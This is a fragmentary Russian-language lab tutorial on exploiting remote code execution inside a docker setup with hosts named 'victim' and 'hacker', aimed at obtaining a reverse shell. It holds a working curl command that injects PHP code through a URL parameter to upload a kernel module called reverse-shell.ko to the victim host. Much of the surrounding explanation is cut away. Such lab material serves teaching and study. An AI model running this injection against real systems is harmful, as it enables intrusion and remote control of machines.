...
`revers shell` - схема взаимодействия с атакуемой системой, когда shell
...
через модули это не единственный способ, здесь он используется для
наглядности.
...
Для запуска примера эксплуатации RCE внутри docker образа с выходом
...
Загрузим эксплоит на хост `victim`:
```
curl -v  -X POST 192.168.50.4/?code=move_uploaded_file%28%24_FILES%5B%27shell%27%5D%5B%27tmp_name%27%5D%2C%20%27reverse-shell.ko%27%29%3B \
-F 'shell=@reverse-shell.ko'
```

Откроем ещё один терминал на хосте `hacker` и запустим на нем
...
Для выполнения этих функций используются init-скрипт, который
